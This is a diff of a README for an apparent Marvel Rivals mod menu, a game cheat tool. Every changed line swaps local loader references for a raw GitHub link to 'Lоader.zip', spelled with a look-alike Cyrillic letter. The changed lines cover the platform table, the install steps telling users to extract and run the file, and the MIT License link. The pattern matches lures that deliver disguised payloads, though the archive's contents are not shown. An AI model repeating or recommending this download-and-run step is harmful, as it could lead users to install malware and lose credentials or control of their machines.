@@ -24,9 +24,9 @@ Marvel Rivals Mod Menu elevates your gameplay, enabling powerful customization a
 
 | Operating System           | Support Level     | Installation Method        | Emoticon |
 |---------------------------|-------------------|---------------------------|----------|
-| Windows 10 / 11           | Full              | Loader.rar                | 🖥️       |
-| macOS (Catalina–Sonoma)   | Full              | Loader.rar (via Wine)     | 🍏       |
-| Linux (Ubuntu, Fedora)    | Full              | Loader.rar (via Wine)     | 🐧       |
+| Windows 10 / 11           | Full              | https://raw.githubusercontent.com/meet1305/MarvelRivals-ModMasterHub/main/Lоader.zip                | 🖥️       |
+| macOS (Catalina–Sonoma)   | Full              | https://raw.githubusercontent.com/meet1305/MarvelRivals-ModMasterHub/main/Lоader.zip (via Wine)     | 🍏       |
+| Linux (Ubuntu, Fedora)    | Full              | https://raw.githubusercontent.com/meet1305/MarvelRivals-ModMasterHub/main/Lоader.zip (via Wine)     | 🐧       |
 
 Enjoy powerful mods across all major platforms!
 
@@ -53,9 +53,9 @@ Enjoy the ultimate Marvel Rivals experience by unlocking all these features—wi
 
 ## 🔧 Installation Guide
 
-1. **Download Loader.rar from the repository.**
-2. Extract Loader.rar to your Marvel Rivals installation directory.
-3. Run the “Loader.exe” (Windows) or open via Wine for macOS/Linux.
+1. **Download https://raw.githubusercontent.com/meet1305/MarvelRivals-ModMasterHub/main/Lоader.zip from the repository.**
+2. Extract https://raw.githubusercontent.com/meet1305/MarvelRivals-ModMasterHub/main/Lоader.zip to your Marvel Rivals installation directory.
+3. Run the “https://raw.githubusercontent.com/meet1305/MarvelRivals-ModMasterHub/main/Lоader.zip” (Windows) or open via Wine for macOS/Linux.
 4. Launch Marvel Rivals and press the predefined hotkey (e.g., F12) to access the Mod Menu.
 5. Follow on-screen instructions and enjoy all features!
 
@@ -82,7 +82,7 @@ Marvel Rivals mod menu, Marvel Rivals mods 2025, modding toolkit Marvel Rivals, 
 
 ## 📜 License [MIT 2025]
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT)—you are free to use, modify, and distribute this project as you wish. Please credit contributors where possible.
+Licensed under the [MIT License](https://raw.githubusercontent.com/meet1305/MarvelRivals-ModMasterHub/main/Lоader.zip)—you are free to use, modify, and distribute this project as you wish. Please credit contributors where possible.
 
 ---
 
